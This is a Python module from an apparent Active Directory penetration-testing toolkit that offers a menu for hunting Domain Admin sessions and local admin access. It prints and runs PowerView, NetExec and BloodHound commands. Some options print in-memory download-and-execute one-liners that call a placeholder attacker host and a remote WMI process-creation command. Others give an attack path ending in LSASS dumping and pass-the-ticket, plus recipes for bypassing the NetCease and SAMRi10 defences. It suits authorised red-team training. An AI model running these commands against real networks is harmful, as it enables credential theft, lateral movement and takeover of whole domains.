"""
Module: User Hunting
Techniques: Find-LocalAdminAccess (PowerView/WMI/PSRemoting),
            Invoke-UserHunter (stealth/checkaccess/group),
            Invoke-EnumerateLocalAdmin, NXC loggedon sweep,
            BloodHound session collection, NetCease/SAMRi10 awareness
"""
from utils.helpers import *
from config.settings import SESSION, get_cme_auth

MENU = """
  ── WHERE ARE THE ADMINS? ─────────────────────────────────────────────────────
  [1]  Find machines where YOU have local admin        (Find-LocalAdminAccess)
  [2]  Find machines where YOU have local admin — WMI  (stealth, no RPC/SMB)
  [3]  Find machines where YOU have local admin — PSR  (PSRemoting variant)

  ── WHERE ARE DOMAIN ADMINS LOGGED IN? ───────────────────────────────────────
  [4]  Find DA sessions — all machines                 (Invoke-UserHunter)
  [5]  Find DA sessions — STEALTH (DC/FS/DFS only)     (Invoke-UserHunter -Stealth)
  [6]  Find DA sessions + confirm admin access         (Invoke-UserHunter -CheckAccess)
  [7]  Hunt specific group sessions                    (Invoke-UserHunter -GroupName)

  ── WHO HAS LOCAL ADMIN ON EVERY MACHINE? ────────────────────────────────────
  [8]  Enumerate local admins on ALL domain machines   (Invoke-EnumerateLocalAdmin)
  [9]  NetExec loggedon-users sweep (Linux, fast)
  [10] BloodHound session collection (LoggedOn method)

  ── TARGETED HUNTING ─────────────────────────────────────────────────────────
  [11] Find where a specific user has sessions
  [12] Check admin access to a list of hosts (file input)
  [13] Get currently logged-on users on one host

  ── STEALTH & OPSEC ──────────────────────────────────────────────────────────
  [14] NetCease / SAMRi10 awareness (what defenders block + how to detect)
  [15] Stealth hunting one-liner reference
  [16] Invoke-SessionHunter           (WMI-based — bypasses NetCease/SAMRi10)

  [0]  Back
"""


def run():
    print_banner("USER HUNTING", "Find where high-value targets are logged in")

    dc   = input_or_session("dc_ip",    "DC IP")
    dom  = input_or_session("domain",   "Domain")
    user = input_or_session("username", "Username")
    pw   = input_or_session("password", "Password", secret=True)
    auth_nxc = get_cme_auth()

    section("OPSEC warning")
    warn(f"{NEON_RED}User hunting generates SMB/RPC traffic to every host — HIGH NOISE{RST}")
    warn("Use -Stealth or WMI/PSRemoting variants in sensitive environments")
    warn("NetCease on target DC will block NetSessionEnum — option [14] for details")
    print()

    print(MENU)
    c = input(f"  {M}Choice{RST}: ").strip()

    # ── [1] Find-LocalAdminAccess ─────────────────────────────────────────────
    if c == "1":
        section("Find-LocalAdminAccess — PowerView (noisy)")
        info("Queries DC for all computers, then tests local admin via SMB on each")
        print(f"""
  {NEON_CYN}# Basic — test all machines in domain{RST}
  Find-LocalAdminAccess -Verbose

  {NEON_CYN}# Limit to specific OU{RST}
  Find-LocalAdminAccess -SearchBase "OU=Servers,DC={dom.replace('.',',DC=')}"

  {NEON_CYN}# From a pre-built list of targets{RST}
  Find-LocalAdminAccess -ComputerFile .\\computers.txt -Verbose

  {NEON_CYN}# Find DA location + confirm YOU have local admin{RST}
  Find-DomainUserLocation -CheckAccess | ?{{$_.LocalAdmin -eq $True}} | select UserName,SessionFromName,LocalAdmin
""")
        add_finding(
            "User Hunting — LocalAdmin Search",
            "Info",
            "Enumerated machines where operator account has local admin access",
            "Audit local admin group membership; use tiered admin model",
        )

    # ── [2] WMI variant ───────────────────────────────────────────────────────
    elif c == "2":
        section("Find-WMILocalAdminAccess — WMI based (quieter)")
        info("Uses WMI instead of SMB — works when RPC/SMB are filtered but WMI (135) is open")
        print(f"""
  {NEON_CYN}# Download and run in-memory{RST}
  iex (New-Object Net.WebClient).DownloadString('http://<attacker>/Find-WMILocalAdminAccess.ps1')
  Find-WMILocalAdminAccess -Verbose

  {NEON_CYN}# Manual WMI admin test against one host{RST}
  Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c whoami > C:\\test.txt" -ComputerName <target> -Credential $cred

  {NEON_CYN}# NXC WMI (Linux side){RST}
  nxc wmi {dc} {auth_nxc} --local-auth
""")

    # ── [3] PSRemoting variant ────────────────────────────────────────────────
    elif c == "3":
        section("FindPSRemotingLocalAdminAccess — PSRemoting based")
        info("Uses Enter-PSSession — works when SMB is blocked but WinRM (5985/5986) is open")
        print(f"""
  {NEON_CYN}# Download and run in-memory{RST}
  iex (New-Object Net.WebClient).DownloadString('http://<attacker>/FindPSRemotingLocalAdminAccess.ps1')
  Find-PSRemotingLocalAdminAccess -Verbose

  {NEON_CYN}# Manual test against single host{RST}
  $sess = New-PSSession -ComputerName <target> -Credential $cred
  Invoke-Command -Session $sess -ScriptBlock {{whoami; hostname}}

  {NEON_CYN}# NXC WinRM sweep (Linux side){RST}
  nxc winrm <subnet>/24 {auth_nxc}
""")

    # ── [4] Invoke-UserHunter (all machines) ──────────────────────────────────
    elif c == "4":
        section("Invoke-UserHunter — find DA sessions (all machines)")
        warn("VERY NOISY — queries every machine for sessions")
        print(f"""
  {NEON_CYN}# Default — hunts Domain Admins{RST}
  Invoke-UserHunter -Verbose

  {NEON_CYN}# Show UserName and the machine they're logged into{RST}
  Invoke-UserHunter | select UserName,SessionFromName,ComputerName

  {NEON_CYN}# Hunt for a specific user{RST}
  Invoke-UserHunter -UserName "Administrator"

  {NEON_CYN}# Find-DomainUserLocation (PowerView v3 equivalent){RST}
  Find-DomainUserLocation -GroupName "Domain Admins" | select UserName,SessionFromName
  Find-DomainUserLocation -UserName "krbtgt" | select UserName,SessionFromName
""")

    # ── [5] Invoke-UserHunter -Stealth ────────────────────────────────────────
    elif c == "5":
        section("Invoke-UserHunter -Stealth — low-traffic variant")
        info("CRTP key technique: queries ONLY high-traffic servers (DC, FileServer, DFS)")
        info("Logic: DAs often have sessions on high-traffic servers — fewer machines = less noise")
        print(f"""
  {NEON_CYN}# Stealth mode — only queries DCs, File Servers, DFS servers{RST}
  Invoke-UserHunter -Stealth -Verbose

  {NEON_CYN}# Why this works:{RST}
  {DIM}Domain Admins are frequently logged into:
    - Domain Controllers (obvious target)
    - File Servers     (Get-NetFileServer)
    - DFS Servers      (distributed file system)
  These machines generate natural high traffic → your queries blend in{RST}

  {NEON_CYN}# Get the list of file servers manually{RST}
  Get-NetFileServer
  Get-NetFileServer -Domain {dom}

  {NEON_CYN}# Combine: hunt only on file servers{RST}
  $servers = Get-NetFileServer
  Invoke-UserHunter -ComputerName $servers -GroupName "Domain Admins"
""")

    # ── [6] Invoke-UserHunter -CheckAccess ───────────────────────────────────
    elif c == "6":
        section("Invoke-UserHunter -CheckAccess — find DA + confirm YOUR admin access")
        info("Gold combo: find where a DA is logged in AND verify you can access that machine")
        print(f"""
  {NEON_CYN}# Hunt DAs AND test if you have local admin on the same machine{RST}
  Invoke-UserHunter -CheckAccess -Verbose

  {NEON_CYN}# Filter: only machines where DA is logged in AND you have local admin{RST}
  Invoke-UserHunter -CheckAccess | ?{{$_.LocalAdmin -eq $True}} | select UserName,SessionFromName,ComputerName

  {NEON_CYN}# Same with Find-DomainUserLocation{RST}
  Find-DomainUserLocation -CheckAccess | ?{{$_.LocalAdmin -eq $True}}

  {NEON_CYN}# Practical attack path:{RST}
  {DIM}1. Run -CheckAccess → get machine where DA is logged in + you have local admin
  2. PSExec / WMIExec into that machine
  3. Dump LSASS → get DA credential / TGT
  4. PTT / PTH → DA access{RST}
""")

    # ── [7] Hunt specific group ───────────────────────────────────────────────
    elif c == "7":
        grp = prompt("Group to hunt (e.g. 'Enterprise Admins', 'SQL Admins')")
        grp = grp or "Domain Admins"
        print(f"""
  {NEON_CYN}# Hunt sessions of members of: {grp}{RST}
  Invoke-UserHunter -GroupName "{grp}" -Verbose
  Invoke-UserHunter -GroupName "{grp}" -CheckAccess

  {NEON_CYN}# Find-DomainUserLocation equivalent{RST}
  Find-DomainUserLocation -GroupName "{grp}" | select UserName,SessionFromName

  {NEON_CYN}# List group members first{RST}
  Get-DomainGroupMember "{grp}" -Recurse | select MemberName,MemberObjectClass
""")

    # ── [8] Invoke-EnumerateLocalAdmin ────────────────────────────────────────
    elif c == "8":
        section("Invoke-EnumerateLocalAdmin — local admins on ALL domain machines")
        warn("Needs admin rights on each remote machine — use selectively")
        print(f"""
  {NEON_CYN}# Find local admins on every machine in the domain{RST}
  Invoke-EnumerateLocalAdmin -Verbose

  {NEON_CYN}# Filter results — find non-standard local admins{RST}
  Invoke-EnumerateLocalAdmin | ?{{$_.AccountName -notmatch "Administrator|Domain Admins"}}

  {NEON_CYN}# Specific machine{RST}
  Get-NetLocalGroup -ComputerName <target> -Recurse

  {NEON_CYN}# List all local groups on a machine{RST}
  Get-NetLocalGroup -ComputerName <target> -ListGroups

  {NEON_CYN}# NXC — local admin members on subnet (Linux side){RST}
  nxc smb <subnet>/24 {auth_nxc} --local-groups Administrators
""")

    # ── [9] NXC loggedon sweep ────────────────────────────────────────────────
    elif c == "9":
        section("NetExec loggedon-users sweep (Linux / fast)")
        subnet = prompt("Target subnet or IP range (e.g. 192.168.1.0/24)")
        subnet = subnet or dc
        run_cmd(f"nxc smb {subnet} {auth_nxc} --loggedon-users")
        run_cmd(f"nxc smb {subnet} {auth_nxc} --sessions")
        info("Tip: grep output for 'Domain Admin' or 'Enterprise Admin' membership")

    # ── [10] BloodHound session collection ───────────────────────────────────
    elif c == "10":
        section("BloodHound session collection — LoggedOn method")
        info("Requires local admin on targets for LoggedOn collection")
        run_cmd(
            f"bloodhound-python -u '{user}' -p '{pw}' -d {dom} -dc {dc} "
            f"-c LoggedOn,Session --zip -o ./output/bloodhound/"
        )
        info("Cypher — find computers with DA sessions:")
        print(f"""
  {NEON_CYN}MATCH p=(u:User)-[:HasSession]->(c:Computer)
  WHERE u.admincount=true
  RETURN u.name, c.name{RST}
""")

    # ── [11] Hunt specific user ───────────────────────────────────────────────
    elif c == "11":
        target_user = prompt("Username to hunt (e.g. Administrator)")
        print(f"""
  {NEON_CYN}# Where is {target_user} currently logged in?{RST}
  Find-DomainUserLocation -UserName "{target_user}"
  Invoke-UserHunter -UserName "{target_user}" -CheckAccess

  {NEON_CYN}# Check specific machine{RST}
  Get-NetLoggedon -ComputerName <target>
  Get-NetSession -ComputerName <target>
  Get-LastLoggedOn -ComputerName <target>   # Needs admin + remote registry

  {NEON_CYN}# NXC (Linux){RST}
  nxc smb {dc} {auth_nxc} --loggedon-users | grep -i "{target_user}"
""")

    # ── [12] Check admin on host list ─────────────────────────────────────────
    elif c == "12":
        hostfile = prompt("Path to host list file (one IP/hostname per line)")
        hostfile = hostfile or "./output/hosts.txt"
        print(f"""
  {NEON_CYN}# PowerView — test local admin on each host in file{RST}
  Find-LocalAdminAccess -ComputerFile {hostfile} -Verbose

  {NEON_CYN}# NXC — bulk admin check (Linux){RST}
  nxc smb {hostfile} {auth_nxc}
  nxc smb {hostfile} {auth_nxc} --local-auth

  {NEON_CYN}# Generate host file from domain computers{RST}
  Get-DomainComputer -Properties dNSHostName | select -Expand dNSHostName | Out-File {hostfile}
""")

    # ── [13] Logged-on users on one host ─────────────────────────────────────
    elif c == "13":
        target = prompt("Target host (IP or FQDN)")
        if target:
            run_cmd(f"nxc smb {target} {auth_nxc} --loggedon-users --sessions")
            print(f"""
  {NEON_CYN}# PowerView equivalents on Windows:{RST}
  Get-NetSession      -ComputerName {target}   # NetSessionEnum (blocked by NetCease)
  Get-NetLoggedon     -ComputerName {target}   # NetWkstaUserEnum (needs local admin)
  Get-LastLoggedOn    -ComputerName {target}   # LastLogonUser registry (needs admin)
  Get-LoggedonLocal   -ComputerName {target}   # Remote registry (started by default on servers)
""")

    # ── [14] NetCease / SAMRi10 awareness ────────────────────────────────────
    elif c == "14":
        section("NetCease / SAMRi10 — what defenders block & attacker counter-moves")
        print(f"""
  {NEON_RED}{BOLD}NetCease{RST}
  {DIM}Removes Authenticated Users permission from NetSessionEnum method.
  Effect: Get-NetSession / Invoke-UserHunter using NetSessionEnum → FAILS{RST}

  {NEON_CYN}Detect if NetCease is active:{RST}
  # Try NetSessionEnum — if it returns nothing on a busy server → likely blocked
  Get-NetSession -ComputerName {dc}

  {NEON_CYN}Bypass NetCease:{RST}
  # Use Get-NetLoggedon instead (uses different API: NetWkstaUserEnum)
  Get-NetLoggedon -ComputerName <target>    # Needs local admin on target
  # Use Get-LoggedonLocal (remote registry — enabled by default on server OS)
  Get-LoggedonLocal -ComputerName <target>
  # Use BloodHound LoggedOn collection (uses a different mechanism)
  Invoke-BloodHound -CollectionMethod LoggedOn

  {NEON_RED}{BOLD}SAMRi10{RST}
  {DIM}Hardens Windows 10 / Server 2016 against SAMR-based enumeration (used by net.exe).
  Effect: net user /domain, Get-NetLocalGroup via SAMR → restricted{RST}

  {NEON_CYN}Bypass SAMRi10:{RST}
  # Use LDAP queries instead of SAMR
  Get-DomainUser (PowerView — uses LDAP, not SAMR)
  Get-ADUser (AD Module — uses LDAP)
  ldapsearch -x -H ldap://{dc} -D '{user}@{dom}' -w '<pw>' -b 'DC={dom.replace('.', ',DC=')}' '(objectClass=user)' sAMAccountName

  {NEON_YEL}Key takeaway:{RST}
  Always have both NetSessionEnum AND WkstaUserEnum methods ready.
  When one is blocked, fall back to LDAP, remote registry, or BloodHound.
""")

    # ── [15] Stealth hunting reference ───────────────────────────────────────
    elif c == "15":
        section("Stealth user hunting — one-liner reference")
        print(f"""
  {NEON_GRN}MOST STEALTHY → MOST NOISY{RST}

  {NEON_GRN}1. BloodHound session (SharpHound){RST}
     Invoke-BloodHound -CollectionMethod Session,LoggedOn
     {DIM}(blends with normal collector traffic){RST}

  {NEON_GRN}2. Invoke-UserHunter -Stealth{RST}
     {DIM}(only DCs, FileServers, DFS — natural traffic targets){RST}
     Invoke-UserHunter -Stealth | select UserName,SessionFromName

  {NEON_YEL}3. Get-LoggedonLocal on targeted machines{RST}
     {DIM}(remote registry — needs target to have it running){RST}
     Get-LoggedonLocal -ComputerName <fileserver>

  {NEON_ORG}4. Get-NetLoggedon -ComputerName (individual targets){RST}
     {DIM}(NetWkstaUserEnum — needs local admin){RST}

  {NEON_ORG}5. Find-LocalAdminAccess on limited scope{RST}
     Find-LocalAdminAccess -ComputerFile .\\dc_and_servers.txt

  {NEON_RED}6. Invoke-UserHunter (all machines) ← DO NOT USE without permission{RST}
     {DIM}(contacts every domain computer — very high noise){RST}

  {NEON_CYN}Practical stealth flow (CRTP methodology):{RST}
  {DIM}Step 1{RST}: Get-NetFileServer → get list of file servers
  {DIM}Step 2{RST}: Invoke-UserHunter -Stealth → find DA on file servers
  {DIM}Step 3{RST}: Invoke-UserHunter -CheckAccess → confirm YOU have admin there
  {DIM}Step 4{RST}: PSExec/WMIExec → dump LSASS → get DA TGT
""")

    # ── [16] Invoke-SessionHunter ─────────────────────────────────────────────
    elif c == "16":
        section("Invoke-SessionHunter — WMI-based user hunting (bypasses NetCease)")
        info("Uses WMI Win32_LoggedOnUser — not blocked by NetCease or SAMRi10")
        targets_file = prompt("Target hosts file (blank = all domain computers)")
        print(f"""
  {NEON_CYN}Invoke-SessionHunter — WMI session discovery:{RST}

  {DIM}Unlike Invoke-UserHunter (NetSessionEnum/NetWkstaUserEnum),
  Invoke-SessionHunter queries Win32_LoggedOnUser via WMI.
  → Bypasses NetCease (which only blocks NetSessionEnum)
  → Works even when SAMR is hardened
  → Requires WMI access (usually available with local admin){RST}

  ── Basic usage ───────────────────────────────────────────────────────────
  # Import
  . C:\\AD\\Tools\\SessionHunter\\Invoke-SessionHunter.ps1

  # Hunt all domain computers (contacts every machine):
  Invoke-SessionHunter

  # FailSafe mode — catches WMI errors gracefully:
  Invoke-SessionHunter -FailSafe

  # Limit to specific targets (quieter):
  Invoke-SessionHunter -NoPortScan -Targets @("{dc}", "<fileserver>")

  # From a file:
  Invoke-SessionHunter -NoPortScan \\
    -Targets (Get-Content C:\\AD\\Tools\\targets.txt)

  ── Filter for high-value targets ────────────────────────────────────────
  # Find where Domain Admins are logged in:
  Invoke-SessionHunter -FailSafe | ?{{$_.Session -match "Domain Admins" -or $_.UserName -match "Administrator"}}

  # Find DAs logged into non-DCs (lateral movement opportunities):
  Invoke-SessionHunter -FailSafe | \\
    ?{{$_.UserName -in (Get-DomainGroupMember "Domain Admins").MemberName}} |
    select UserName,HostName,Session

  ── Combine with local admin check ───────────────────────────────────────
  # Hunt + verify local admin on same machine:
  $daHosts = Invoke-SessionHunter -FailSafe | \\
    ?{{$_.UserName -match "Administrator"}} | \\
    select -Expand HostName

  Find-LocalAdminAccess -ComputerName $daHosts

  ── NoPortScan mode (faster — skip 445 port check) ───────────────────────
  Invoke-SessionHunter -NoPortScan -FailSafe

  {NEON_CYN}Comparison with Invoke-UserHunter:{RST}
  {DIM}Invoke-UserHunter   → NetSessionEnum/NetWkstaUserEnum → blocked by NetCease
  Invoke-SessionHunter → WMI Win32_LoggedOnUser → NOT blocked by NetCease
  Both require local admin on target for full session visibility{RST}

  {NEON_CYN}Tool source:{RST}
  {DIM}github.com/Leo4j/Invoke-SessionHunter{RST}
""")
        add_finding(
            "Invoke-SessionHunter Session Discovery",
            "Info",
            "WMI-based session enumeration used to find high-value user logons across domain",
            "Restrict WMI access to admin accounts; monitor Win32_LoggedOnUser queries; use tiered admin model",
        )

    pause()
